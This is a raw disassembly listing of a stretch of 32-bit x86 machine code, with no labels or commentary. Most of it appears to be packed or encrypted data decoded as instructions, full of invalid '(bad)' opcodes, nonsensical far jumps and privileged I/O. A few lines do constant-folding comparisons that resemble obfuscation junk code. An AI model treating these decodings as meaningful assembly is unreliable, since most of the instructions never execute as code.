  41cfcf:	add    al,0x6
  41cfd1:	pop    esi
  41cfd2:	iret   
  41cfd3:	test   BYTE PTR [eax-0x3b688d18],0x2e
  41cfda:	in     eax,dx
  41cfdb:	mov    dh,0xc
  41cfdd:	sbb    esp,esi
  41cfdf:	jmp    0xdf0e:0x21696b8c
  41cfe6:	pop    esi
  41cfe7:	mov    ch,0x27
  41cfe9:	popf   
  41cfea:	mov    ah,0x33
  41cfec:	rol    BYTE PTR [edx],0xce
  41cfef:	sub    al,bh
  41cff1:	outs   dx,DWORD PTR ds:[esi]
  41cff2:	aad    0xf9
  41cff4:	adc    edx,0xffffff8d
  41cff7:	mov    edi,0x61f1c2b2
  41cffc:	ret    0xa245
  41cfff:	cli    
  41d000:	pop    ds
  41d001:	mov    ds:0xf18f16e8,al
  41d006:	idiv   DWORD PTR [esi-0x7a08ec22]
  41d00c:	lds    ebx,FWORD PTR ds:0x2b0aeb1b
  41d012:	xor    BYTE PTR [esi],ch
  41d014:	push   esi
  41d015:	fild   DWORD PTR ds:0xc19e975c
  41d01b:	add    al,0x2a
  41d01d:	xchg   esi,eax
  41d01e:	pop    esp
  41d01f:	je     0x41d02a
  41d021:	std    
  41d022:	cs jecxz 0x41d043
  41d025:	cli    
  41d026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d027:	xchg   esi,eax
  41d028:	rcr    BYTE PTR [ebp-0xc69fa01],cl
  41d02e:	bound  edx,QWORD PTR [ebp-0x2b]
  41d031:	push   ecx
  41d032:	lock out 0xac,eax
  41d035:	test   BYTE PTR [ecx],dl
  41d037:	ins    DWORD PTR es:[edi],dx
  41d038:	jns    0x41d009
  41d03a:	fisub  WORD PTR [eax-0x1be4fb70]
  41d040:	cdq    
  41d041:	(bad)  
  41d042:	retf   
  41d043:	jmp    0x41d03b
  41d045:	push   0xe516efdd
  41d04a:	xchg   esi,eax
  41d04b:	and    BYTE PTR [esi-0x190cc38b],bl
  41d051:	sbb    DWORD PTR es:[ecx+0xb24cfa2],ecx
  41d058:	xchg   esi,eax
  41d059:	pop    esi
  41d05a:	or     dl,ah
  41d05c:	push   0x4dc1da27
  41d061:	in     eax,0xb8
  41d063:	loop   0x41d05e
  41d065:	enter  0x76ba,0x43
  41d069:	lea    eax,[ebp+0x11]
  41d06c:	stc    
  41d06d:	cmp    al,0xc2
  41d06f:	push   edi
  41d070:	lahf   
  41d071:	mov    eax,0x9b6337e5
  41d076:	xchg   edi,eax
  41d077:	daa    
  41d078:	mul    DWORD PTR [esi]
  41d07a:	sbb    ah,BYTE PTR [edi+0x2d]
  41d07d:	jp     0x41d086
  41d07f:	outs   dx,DWORD PTR ds:[esi]
  41d080:	mov    edi,0xf1d6663d
  41d085:	jmp    0x554e:0xb2de947e
  41d08c:	(bad)  
  41d08d:	ins    BYTE PTR es:[edi],dx
  41d08e:	fld    DWORD PTR [ecx+esi*4-0x53a5554]
  41d095:	mov    ch,0x8a
  41d097:	loop   0x41d101
  41d099:	sbb    DWORD PTR [eax],esi
  41d09b:	or     BYTE PTR [edi+0x4a],al
  41d09e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d09f:	fiadd  DWORD PTR [ebp-0x71f150df]
  41d0a5:	inc    ebp
  41d0a6:	cmp    al,0xc9
  41d0a8:	jmp    0x41d074
  41d0aa:	push   esp
  41d0ab:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41d0ad:	sub    DWORD PTR [edi],edx
  41d0af:	add    DWORD PTR [esi],esp
  41d0b1:	sub    esi,DWORD PTR [ebx-0x5]
  41d0b4:	xchg   esi,eax
  41d0b5:	fmul   DWORD PTR [ecx+0x14]
  41d0b8:	les    esi,FWORD PTR [ebx-0x1e]
  41d0bb:	mov    eax,ds:0x97e40538
  41d0c0:	jmp    0x7943de6b
  41d0c5:	test   DWORD PTR [edx+0x2e],0xfb92ee5d
  41d0cc:	jns    0x41d13d
  41d0ce:	sub    al,cl
  41d0d0:	mov    cl,BYTE PTR [esp+0x38]
  41d0d4:	sub    al,0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0x41bc6585
  41d15f:	cmp    ah,bh
  41d161:	mov    esi,0x18165d36
  41d166:	mov    esp,0xe1181812
  41d16b:	pop    ebx
  41d16c:	lahf   
  41d16d:	clc    
  41d16e:	or     bh,ch
  41d170:	mov    edx,0xae55e17b
  41d175:	outs   dx,BYTE PTR ds:[esi]
  41d176:	fs inc eax
  41d178:	lods   al,BYTE PTR ds:[esi]
  41d179:	sahf   
  41d17a:	inc    esp
  41d17b:	jecxz  0x41d11e
  41d17d:	mov    eax,ds:0xe2335785
  41d182:	xchg   edi,eax
  41d183:	jmp    0x40cfcdf3
  41d188:	dec    eax
  41d189:	mov    ah,BYTE PTR [eax+0x494fe4a2]
  41d18f:	ja     0x41d16c
  41d191:	aad    0x77
  41d193:	fistp  DWORD PTR [edi-0x71]
  41d196:	inc    edi
  41d197:	jge    0x41d142
  41d199:	lock call 0x3e96:0x2be622b9
  41d1a1:	push   edi
  41d1a2:	sbb    DWORD PTR [ecx],esp
  41d1a4:	push   ss
  41d1a5:	sti    
  41d1a6:	pop    esp
  41d1a7:	mov    gs,WORD PTR [ebx+0x47]
  41d1aa:	xchg   edx,eax
  41d1ab:	loop   0x41d21f
  41d1ad:	loop   0x41d1d2
  41d1af:	es aam 0x11
  41d1b2:	test   DWORD PTR [ecx],0xff8ea03f
  41d1b8:	mov    WORD PTR [esi],es
  41d1ba:	das    
  41d1bb:	shl    ebp,cl
  41d1bd:	adc    al,0x85
  41d1bf:	pop    eax
  41d1c0:	mul    esi
  41d1c2:	shr    BYTE PTR [ebx+0x41],0xd7
  41d1c6:	add    bl,dh
  41d1c8:	lahf   
  41d1c9:	aad    0x41
  41d1cb:	mov    ah,0x6f
  41d1cd:	add    edi,edx
  41d1cf:	jg     0x41d1c6
  41d1d1:	bound  esi,QWORD PTR es:[ebx]
  41d1d4:	das    
  41d1d5:	popf   
  41d1d6:	push   edx
  41d1d7:	mov    eax,ebp
  41d1d9:	dec    ebp
  41d1da:	cmp    DWORD PTR [ebp-0x58ddc1b3],eax
  41d1e0:	xchg   ebp,eax
  41d1e1:	or     eax,0xc59cfc8b
  41d1e6:	je     0x41d178
  41d1e8:	test   DWORD PTR [edx],eax
  41d1ea:	dec    ebp
  41d1eb:	mov    bh,0x67
  41d1ed:	fist   DWORD PTR [ebp+0x45]
  41d1f0:	add    BYTE PTR ds:0x8af78e45,cl
  41d1f6:	cli    
  41d1f7:	mov    ds:0xf3f5b9fd,eax
  41d1fc:	xchg   esi,eax
  41d1fd:	inc    ebx
  41d1fe:	or     ah,cl
  41d200:	xchg   esp,eax
  41d201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d202:	(bad)  [ebp+0x68844aff]
  41d208:	mov    dl,0x6d
  41d20a:	mov    fs,ebp
  41d20c:	lahf   
  41d20d:	mov    bh,BYTE PTR [ebx+0x6b]
  41d210:	aas    
  41d211:	rol    ah,0xa7
  41d214:	sub    eax,ebx
  41d216:	add    eax,esi
  41d218:	movsx  edi,sp
  41d21b:	clc    
  41d21c:	sbb    dh,bh
  41d21e:	xchg   BYTE PTR [ebp+0x51],ah
  41d221:	jmp    FWORD PTR [edi+0x59]
  41d224:	xchg   ecx,eax
  41d225:	jle    0x41d1b6
  41d227:	cld    
  41d228:	adc    edx,esp
  41d22a:	and    dh,dl
  41d22c:	ror    DWORD PTR [eax-0x6de2449d],1
  41d232:	in     al,dx
  41d233:	xchg   ecx,eax
  41d234:	out    0xec,al
  41d236:	xor    eax,0x1a20703b
  41d23b:	and    ebp,ecx
  41d23d:	clc    
  41d23e:	hlt    
  41d23f:	ja     0x41d269
  41d241:	test   DWORD PTR [ebx-0x7c],ecx
  41d244:	mov    ebx,0x64f2527c
  41d249:	fldcw  WORD PTR [ecx-0x43]
  41d24c:	call   0x3798:0xa2f8616d
  41d253:	xor    esi,DWORD PTR [eax-0x79]
  41d256:	or     BYTE PTR [ebx-0x3acda0c0],bh
  41d25c:	adc    BYTE PTR ds:0xe488391a,ah
  41d262:	cdq    
  41d263:	pop    ebx
  41d264:	jmp    0xabd9519a
  41d269:	iret   
  41d26a:	mov    ah,0xce
  41d26c:	mov    al,0x7c
  41d26e:	jbe    0x41d225
  41d270:	es (bad) 
  41d272:	lahf   
  41d273:	scas   eax,DWORD PTR es:[edi]
  41d274:	lods   eax,DWORD PTR ds:[esi]
  41d275:	inc    edx
  41d276:	or     eax,0x1364d028
  41d27b:	mov    al,0xf7
  41d27d:	mov    al,0x65
  41d27f:	sahf   
  41d280:	outs   dx,DWORD PTR ds:[esi]
  41d281:	ins    BYTE PTR es:[edi],dx
  41d282:	sbb    eax,0x7cd3cc7c
  41d287:	adc    dl,bl
  41d289:	out    0xbb,eax
  41d28b:	push   0x50
  41d28d:	jno    0x41d285
  41d28f:	sbb    al,0xee
  41d291:	imul   ebx,DWORD PTR [edx],0x822086ff
  41d297:	adc    ebp,DWORD PTR ds:0x22d17339
  41d29d:	addr16 push ebp
  41d29f:	push   DWORD PTR es:[eax+edx*2]
  41d2a3:	ret    0xbff8
  41d2a6:	push   eax
  41d2a7:	test   BYTE PTR [ebx-0x53],ch
  41d2aa:	sbb    BYTE PTR ds:0x81fae97d,ch
  41d2b0:	mov    DWORD PTR [ecx+0x48b04cf0],ecx
  41d2b6:	repz mov al,ds:0x190e6b38
  41d2bc:	cmp    DWORD PTR [edx-0xa],ebx
  41d2bf:	lea    esp,[edi-0x5e]
  41d2c2:	(bad)  
  41d2c3:	cli    
  41d2c4:	mov    edx,0x3ed1fe32
  41d2c9:	cmp    esi,DWORD PTR [ebp+0x7a]
  41d2cc:	push   0x578f5ef6
  41d2d1:	adc    ebp,esi
  41d2d3:	lods   eax,DWORD PTR ds:[esi]
  41d2d4:	(bad)  
  41d2d5:	lds    ecx,FWORD PTR [edx]
  41d2d7:	(bad)  
  41d2d8:	in     al,0x3a
  41d2da:	sahf   
  41d2db:	push   edx
  41d2dc:	pop    eax
  41d2dd:	sahf   
  41d2de:	mov    WORD PTR [edx-0x13470653],fs
  41d2e4:	rcr    DWORD PTR [edi-0x63],cl
  41d2e7:	or     BYTE PTR [ebx],bl
  41d2e9:	(bad)  
  41d2ea:	push   ebx
  41d2eb:	fstp   DWORD PTR [ebx+0x11b7c450]
  41d2f1:	mov    edx,0x913a32b0
  41d2f6:	push   esi
  41d2f7:	cmp    eax,0x4853ffa
  41d2fc:	cmp    DWORD PTR [edi+eax*4+0xb9637d1],ecx
  41d303:	and    al,0x3b
  41d305:	lods   eax,DWORD PTR ds:[esi]
  41d306:	out    dx,al
  41d307:	push   cs
  41d308:	out    0xe3,eax
  41d30a:	addr16 rcr eax,cl
  41d30d:	cmp    bh,BYTE PTR [ecx]
  41d30f:	lods   eax,DWORD PTR ds:[esi]
  41d310:	xchg   BYTE PTR [ebx+0xe],bl
  41d313:	sbb    BYTE PTR [ecx+eiz*4],al
  41d316:	cwde   
  41d317:	mov    al,0xa3
  41d319:	push   esi
  41d31a:	push   esi
  41d31b:	ror    DWORD PTR [ebp-0x1f205a39],1
  41d321:	mov    eax,0xc0edcf
  41d326:	mov    al,BYTE PTR [ecx-0x2b20cd70]
  41d32c:	nop
  41d32d:	(bad)  
  41d32e:	adc    BYTE PTR [esi],dl
  41d330:	pop    edx
  41d331:	inc    edx
  41d332:	lahf   
  41d333:	fist   WORD PTR [eax+0x201aa9c9]
  41d339:	and    ah,0x53
  41d33c:	jbe    0x41d2d1
  41d33e:	adc    DWORD PTR [esi*8+0x3cd5e77b],ebx
  41d345:	hlt    
  41d346:	data16 stos BYTE PTR es:[edi],al
  41d348:	jmp    0x4d38:0x399630f4
  41d34f:	mov    dh,0xe7
  41d351:	clc    
  41d352:	cwde   
  41d353:	jnp    0x41d2d5
  41d355:	xchg   ebx,eax
  41d356:	pop    edi
  41d357:	pop    ds
  41d358:	sub    ebp,DWORD PTR [eax+esi*2-0xd]
  41d35c:	lahf   
  41d35d:	sahf   
  41d35e:	stos   BYTE PTR es:[edi],al
  41d35f:	fs add eax,0xf29643d4
  41d365:	popf   
  41d366:	pusha  
  41d367:	adc    DWORD PTR [eax],edi
  41d369:	jnp    0x41d31e
  41d36b:	lods   eax,DWORD PTR ds:[esi]
  41d36c:	sbb    eax,0xe0410247
  41d371:	jp     0x41d371
  41d373:	xor    eax,0x4a916583
  41d378:	arpl   WORD PTR [esi],sp
  41d37a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d37b:	leave  
  41d37c:	jbe    0x41d3c8
  41d37e:	rcr    DWORD PTR [ecx-0x69e1c7df],1
  41d384:	(bad)  
  41d385:	sbb    ebp,esi
  41d387:	ins    BYTE PTR es:[edi],dx
  41d388:	dec    esi
  41d389:	mov    eax,cs:0xe4ad3ae8
  41d38f:	fs test al,cl
  41d392:	gs jmp 0x41d406
  41d395:	das    
  41d396:	xchg   ebx,eax
  41d397:	or     BYTE PTR [edi+0x3e],al
  41d39a:	jge    0x41d37b
  41d39c:	fsub   QWORD PTR [edx-0x79ece4b5]
  41d3a2:	and    bl,ah
  41d3a4:	sbb    al,0xfb
  41d3a6:	mov    ecx,0xfce22804
  41d3ab:	jl     0x41d37d
  41d3ad:	sub    ebp,DWORD PTR [edi-0x75]
  41d3b0:	inc    edi
  41d3b1:	arpl   WORD PTR [ecx-0xa1c52bd],bx
  41d3b7:	popa   
  41d3b8:	stos   BYTE PTR es:[edi],al
  41d3b9:	adc    ecx,DWORD PTR [ebx+ebx*1]
  41d3bc:	sbb    al,0xe1
  41d3be:	pushf  
  41d3bf:	repz fisttp WORD PTR [esi]
  41d3c2:	fisubr DWORD PTR [edi+0x4e]
  41d3c5:	fdiv   DWORD PTR [edi]
  41d3c7:	mov    ds:0xa3bf9195,al
  41d3cc:	es xchg edx,eax
  41d3ce:	or     DWORD PTR [ecx+0xd],0xffffff89
  41d3d2:	stos   BYTE PTR es:[edi],al
  41d3d3:	xor    eax,0x3ba4ca1b
  41d3d8:	mov    esi,0x8bcc21f
  41d3dd:	not    BYTE PTR [ecx+edx*4]
  41d3e0:	push   ds
  41d3e1:	dec    ebp
  41d3e2:	dec    ecx
  41d3e3:	dec    ebp
  41d3e4:	aam    0x2c
  41d3e6:	push   esp
  41d3e7:	(bad)  
  41d3e8:	shr    DWORD PTR [esi-0x4d],cl
  41d3eb:	(bad)  
  41d3ec:	xchg   ecx,eax
  41d3ed:	stos   BYTE PTR es:[edi],al
  41d3ee:	jo     0x41d386
  41d3f0:	xchg   ecx,eax
  41d3f1:	ins    DWORD PTR es:[edi],dx
  41d3f2:	push   esp
  41d3f3:	ret    0xc41f
  41d3f6:	xor    BYTE PTR [ecx+eax*1-0x49],ah
  41d3fa:	xlat   BYTE PTR ds:[ebx]
  41d3fb:	xor    eax,0x5f838844
  41d400:	retf   0x23ee
  41d403:	push   0x7c
  41d405:	mov    edx,DWORD PTR ds:[edx+0x42c021f3]
  41d40c:	sbb    eax,0x214a4ade
  41d411:	mov    edi,?
  41d413:	xchg   ebx,eax
  41d414:	mov    ds:0x45e1d7f1,al
  41d419:	fcmove st,st(6)
  41d41b:	data16 mov al,0x27
  41d41e:	mov    eax,0x3817b285
  41d423:	inc    eax
  41d424:	out    dx,eax
  41d425:	sub    eax,0x368baef5
  41d42a:	push   es
  41d42b:	mov    al,ds:0x414a2235
  41d430:	in     eax,dx
  41d431:	shl    BYTE PTR [ebx+0x183b04a2],0x85
  41d438:	out    0x65,al
  41d43a:	mov    ecx,0xb65e5f02
  41d43f:	fwait
  41d440:	dec    ebp
  41d441:	pop    eax
  41d442:	mov    dl,0x82
  41d444:	nop
  41d445:	test   al,0x42
  41d447:	das    
  41d448:	jle    0x41d3d6
  41d44a:	arpl   WORD PTR [di+0x5b],cx
  41d44e:	je     0x41d3e7
  41d450:	vpsubb ymm1,ymm3,YMMWORD PTR [edx]
  41d454:	pop    ecx
  41d455:	jmp    0xf352:0x6dd1dc56
  41d45c:	sahf   
  41d45d:	outs   dx,DWORD PTR ds:[esi]
  41d45e:	or     esp,DWORD PTR [edi+esi*1]
  41d461:	xor    ah,BYTE PTR [edx]
  41d463:	fldcw  WORD PTR [ecx-0x62]
  41d466:	mov    edi,0xa71dab17
  41d46b:	jecxz  0x41d4cc
  41d46d:	les    ecx,FWORD PTR [eax+ebp*1+0x77e15c8f]
  41d474:	rcr    DWORD PTR [ecx+0x582f41cc],1
  41d47a:	add    esi,DWORD PTR [esi-0x5c]
  41d47d:	loope  0x41d438
  41d47f:	xor    BYTE PTR [ebp-0x14d51eef],ch
  41d485:	mov    eax,DWORD PTR [eax+0x54]
  41d488:	(bad)  
  41d489:	jmp    0x1a7f7000
  41d48e:	jns    0x41d4bf
  41d490:	aad    0xa4
  41d492:	jg     0x41d448
  41d494:	js     0x41d43e
  41d496:	xchg   ecx,esp
  41d498:	jmp    0x3940:0xb8fe49fa
  41d49f:	fwait
  41d4a0:	mov    ecx,0xfa914944
  41d4a5:	sbb    BYTE PTR [eax],ah
  41d4a7:	xor    eax,0x2965b00e
  41d4ac:	or     al,0x28
  41d4ae:	pusha  
  41d4af:	jle    0x41d4f6
  41d4b1:	xor    esp,edi
  41d4b3:	mov    bh,0x27
  41d4b5:	out    dx,eax
  41d4b6:	add    al,0x66
  41d4b8:	pushf  
  41d4b9:	adc    eax,0x47eeb780
  41d4be:	add    eax,0xe798b91
  41d4c3:	das    
  41d4c4:	icebp  
  41d4c5:	repnz or BYTE PTR [ebp-0x2a80cf10],ah
  41d4cc:	mov    eax,ds:0x27eefc30
  41d4d1:	push   ds
  41d4d2:	mov    esp,0x7dc82289
  41d4d7:	dec    ecx
  41d4d8:	rep stos DWORD PTR es:[edi],eax
  41d4da:	pop    edx
  41d4db:	aaa    
  41d4dc:	fwait
  41d4dd:	sub    BYTE PTR [esi],bl
  41d4df:	nop
  41d4e0:	jl     0x41d530
  41d4e2:	adc    dh,BYTE PTR [edx]
  41d4e4:	out    dx,eax
  41d4e5:	mov    eax,0x6e75c4e4
  41d4ea:	(bad)  
  41d4ec:	popa   
  41d4ed:	es popf 
  41d4ef:	stos   BYTE PTR es:[edi],al
  41d4f0:	std    
  41d4f1:	adc    eax,0x9f696a9c
  41d4f6:	test   DWORD PTR [ebp+esi*1+0x5d8fd9aa],ebx
  41d4fd:	xchg   esp,eax
  41d4fe:	(bad)  
  41d4ff:	jge    0x41d531
  41d501:	(bad)  
  41d502:	or     eax,0x9333709d
  41d507:	call   0x4a3c1091
  41d50c:	and    BYTE PTR [ecx+0x2cdc8ae4],0x97
  41d513:	mov    ah,0x9
  41d515:	xchg   edx,eax
  41d516:	mov    WORD PTR [ebp+0x6817675f],?
  41d51c:	jne    0x41d926
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d57f
  41d54b:	in     eax,dx
  41d54c:	sbb    edi,DWORD PTR [esi-0x26]
  41d54f:	push   ebp
  41d550:	push   ss
  41d551:	sbb    BYTE PTR [edx+edx*1-0x71b0e7e8],bh
  41d558:	sub    bh,dh
  41d55a:	dec    ebp
  41d55b:	dec    esi
  41d55c:	pop    eax
  41d55d:	(bad)  
  41d55e:	scas   eax,DWORD PTR es:[edi]
  41d55f:	adc    eax,DWORD PTR [edi]
  41d561:	xor    al,BYTE PTR [ecx-0x5b]
  41d564:	cs xchg ecx,eax
  41d566:	sar    cl,cl
  41d568:	or     ecx,ebp
  41d56a:	lods   eax,DWORD PTR ds:[esi]
  41d56b:	mov    eax,ds:0xd21a0c17
  41d570:	xor    BYTE PTR [edx+0x1c3988ea],0x2a
  41d577:	jge    0x41d5ed
  41d579:	mov    fs,WORD PTR [ebx+0x1588344a]
  41d57f:	jg     0x41d5b7
  41d581:	jmp    0xe431:0xccfee0cc
  41d588:	lods   al,BYTE PTR ds:[esi]
  41d589:	js     0x41d524
  41d58b:	push   es
  41d58c:	pop    edx
  41d58d:	or     dh,ch
  41d58f:	fiadd  DWORD PTR [edi+0x45]
  41d592:	xor    al,0x74
  41d594:	mov    cl,BYTE PTR [edx-0x48c432e5]
  41d59a:	bound  ecx,QWORD PTR [ebp+0x4e]
  41d59d:	jp     0x41d5e6
  41d59f:	icebp  
  41d5a0:	jp     0x41d59f
  41d5a2:	in     al,0xc6
  41d5a4:	or     eax,0xda0afdaa
  41d5a9:	test   BYTE PTR [eax+0x20b361e1],dl
  41d5af:	out    dx,al
  41d5b0:	lock data16 (bad) 
  41d5b3:	out    0x2e,al
  41d5b5:	push   esi
  41d5b6:	aaa    
  41d5b7:	mov    edx,edi
  41d5b9:	dec    edx
  41d5ba:	cmc    
  41d5bb:	pop    edi
  41d5bc:	pop    ebx
  41d5bd:	scas   al,BYTE PTR es:[edi]
  41d5be:	cld    
  41d5bf:	mov    edi,0x904646f5
  41d5c4:	cmp    al,0x9b
  41d5c6:	adc    al,0xef
  41d5c8:	fisub  DWORD PTR [eax]
  41d5ca:	xor    bl,BYTE PTR [ebx+ecx*1+0x4ae4cd66]
  41d5d1:	aam    0x3
  41d5d3:	mov    eax,ds:0x7c50334f
  41d5d8:	mov    ah,0xd6
  41d5da:	cmp    BYTE PTR [ebx+0x59],ah
  41d5dd:	dec    esi
  41d5de:	push   esp
  41d5df:	mov    bl,0x1b
  41d5e1:	cmp    dl,dl
  41d5e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5e4:	lahf   
  41d5e5:	adc    al,0x74
  41d5e7:	mov    DWORD PTR ds:[ebx],esi
  41d5ea:	test   DWORD PTR [ebx],ebp
  41d5ec:	sub    DWORD PTR [ebp+eiz*8-0x5c],esp
  41d5f0:	cmp    BYTE PTR [edx],bh
  41d5f2:	inc    esi
  41d5f3:	sub    ch,al
  41d5f5:	leave  
  41d5f6:	popa   
  41d5f7:	push   0xc2c75e63
  41d5fc:	cmp    bh,bh
  41d5fe:	xchg   esi,eax
  41d5ff:	jno    0x41d5fd
  41d601:	out    0xd1,al
  41d603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d604:	popf   
  41d605:	mov    esp,0x42b899ec
  41d60a:	push   0xd10a15b6
  41d60f:	sbb    al,0x47
  41d611:	xchg   ebp,eax
  41d612:	cmp    al,0x1e
  41d614:	dec    ecx
  41d615:	xlat   BYTE PTR gs:[ebx]
  41d617:	and    BYTE PTR [edi-0x46],0x61
  41d61b:	inc    DWORD PTR [eax-0x3b171a32]
  41d621:	adc    eax,0x36d57467
  41d626:	fs push 0x4c3fc99c
  41d62c:	test   eax,0xe8d3eb6c
  41d631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d632:	stos   BYTE PTR es:[edi],al
  41d633:	or     eax,0x783a25cc
  41d638:	cli    
  41d639:	dec    esi
  41d63a:	sub    BYTE PTR [edx-0x65d2bec2],0x45
  41d641:	mov    edx,0x55f1dba3
  41d646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d647:	adc    ch,BYTE PTR [eax-0x7b]
  41d64a:	adc    bh,BYTE PTR [edi]
  41d64c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d64d:	sub    BYTE PTR [edi-0x6e],al
  41d650:	sub    ebx,ebp
  41d652:	bound  eax,QWORD PTR [eax]
  41d654:	mov    esp,0xeb4c68b5
  41d659:	es dec esp
  41d65b:	cmp    BYTE PTR [esi+edx*2+0x198d806a],dh
  41d662:	aaa    
  41d663:	not    cl
  41d665:	jle    0x41d6d0
  41d667:	pop    edx
  41d668:	dec    eax
  41d669:	jno    0x41d635
  41d66b:	mov    ah,0x21
  41d66d:	sbb    DWORD PTR [ecx],edx
  41d66f:	jmp    0x9b5b:0xb0500114
  41d676:	xchg   ecx,eax
  41d677:	jnp    0x41d607
  41d679:	ins    BYTE PTR es:[edi],dx
  41d67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d67b:	shl    DWORD PTR [edx+0x74],cl
  41d67e:	mov    edi,0xa9c7e691
  41d683:	xor    DWORD PTR [ebx-0x7e],0x10269c30
  41d68a:	mov    ds:0x455d9e36,al
  41d68f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d690:	pop    edx
  41d691:	jge    0x41d6e8
  41d693:	mov    cl,0x8e
  41d695:	cli    
  41d696:	inc    eax
  41d697:	jbe    0x41d67f
  41d699:	in     eax,0xf3
  41d69b:	pop    edi
  41d69c:	or     ah,BYTE PTR ds:0x1b983d94
  41d6a2:	mov    ebx,0x47bdc1e6
  41d6a7:	dec    esp
  41d6a8:	lahf   
  41d6a9:	shl    edx,0x46
  41d6ac:	adc    dh,BYTE PTR [ebp+0x37]
  41d6af:	(bad)  
  41d6b0:	stos   DWORD PTR es:[edi],eax
  41d6b1:	cld    
  41d6b2:	sub    al,0x3f
  41d6b4:	mov    ebx,DWORD PTR [eax+0x5b]
  41d6b7:	sub    BYTE PTR [ebp+0x8a855c9],dl
  41d6bd:	mov    bh,0x14
  41d6bf:	loopne 0x41d64e
  41d6c1:	or     ah,ah
  41d6c3:	lahf   
  41d6c4:	sub    bh,dl
  41d6c6:	push   0xffffff82
  41d6c8:	fldcw  WORD PTR [esi+esi*1+0x5d]
  41d6cc:	lods   al,BYTE PTR ds:[esi]
  41d6cd:	rol    DWORD PTR [edx],1
  41d6cf:	fsubr  QWORD PTR [ebp+0x6590b78b]
  41d6d5:	xchg   edi,eax
  41d6d6:	ins    BYTE PTR es:[edi],dx
  41d6d7:	sar    DWORD PTR [edi+0x45],0xdd
  41d6db:	popf   
  41d6dc:	xor    ch,BYTE PTR [edx-0x5d]
  41d6df:	and    bl,BYTE PTR [ebx-0x5b8be67e]
  41d6e5:	mov    eax,DWORD PTR [ebp-0x2f8f1008]
  41d6eb:	xchg   esi,eax
  41d6ec:	or     ebx,edi
  41d6ee:	data16 xor BYTE PTR [ecx+0x3b],dl
  41d6f2:	out    0x8b,al
  41d6f4:	and    al,0xfe
  41d6f6:	in     eax,dx
  41d6f7:	mov    ebp,0xa84e5e2
  41d6fc:	mov    ch,dl
  41d6fe:	test   DWORD PTR [edx-0x2af6ab8],ebx
  41d704:	sub    BYTE PTR [ebp-0x2f214f28],dh
  41d70a:	nop
  41d70b:	inc    dl
  41d70d:	push   ebp
  41d70e:	(bad)  
  41d70f:	pop    ebp
  41d710:	or     al,dh
  41d712:	loopne 0x41d71e
  41d714:	sub    DWORD PTR [edi],edi
  41d716:	and    al,0x4e
  41d718:	jmp    0x589:0xbb8c04
  41d71f:	dec    eax
  41d720:	aaa    
  41d721:	ret    0x2d94
  41d724:	cwde   
  41d725:	or     eax,0xf7bff195
  41d72a:	jmp    0x41d726
  41d72c:	dec    ebp
  41d72d:	shl    BYTE PTR [edi],cl
  41d72f:	push   esi
  41d730:	cli    
  41d731:	scas   eax,DWORD PTR es:[edi]
  41d732:	(bad)  
  41d733:	fwait
  41d734:	popa   
  41d735:	add    al,0x75
  41d737:	pop    ds
  41d738:	xchg   edi,eax
  41d739:	es xor ebx,esp
  41d73c:	(bad)  
  41d73e:	ret    0xaca0
  41d741:	and    eax,0xc1fcd4fe
  41d746:	mov    WORD PTR [edx],?
  41d748:	mov    WORD PTR cs:[esi-0x52],ss
  41d74c:	jb     0x41d743
  41d74e:	fstp   QWORD PTR [ebp-0x60]
  41d751:	jb     0x41d723
  41d753:	xor    BYTE PTR [ebx],ah
  41d755:	pop    ds
  41d756:	enter  0xc2d9,0xca
  41d75a:	sbb    DWORD PTR [eax+0x5f],0x1a
  41d75e:	xor    eax,DWORD PTR [ebx+0x1c]
  41d761:	or     eax,0x8f6e8e69
